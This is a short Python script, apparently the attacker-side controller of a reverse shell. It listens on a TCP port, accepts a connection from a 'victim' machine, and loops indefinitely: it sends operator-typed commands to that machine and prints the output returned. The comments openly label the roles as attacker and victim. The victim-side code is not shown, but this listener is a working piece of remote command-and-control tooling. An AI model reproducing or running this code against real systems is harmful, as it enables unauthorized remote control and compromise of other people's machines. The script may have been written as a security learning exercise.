import socket 
from configs import HOST, PORT

# create TCP socket object for data exchange 
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Bind server to HOST IP adress and PORT program adress
server.bind((HOST, PORT))
# Listen mode to accept incoming connections
server.listen()
# Wait for client to connect. Adress contains IP and port
client, adress = server.accept()

# Infinite loop for continuous command execution
while True:
    
    print(f"connected to {adress}")
    cmd_input = input("Enter a command") # Attacker prompts command 
    # Send attack command to victim 
    client.send(cmd_input.encode("utf-8"))
    """
    Victim executes command > capture the output > send back over the network
    """
    # Results of command execution
    print(client.recv(1024).decode("utf-8"))

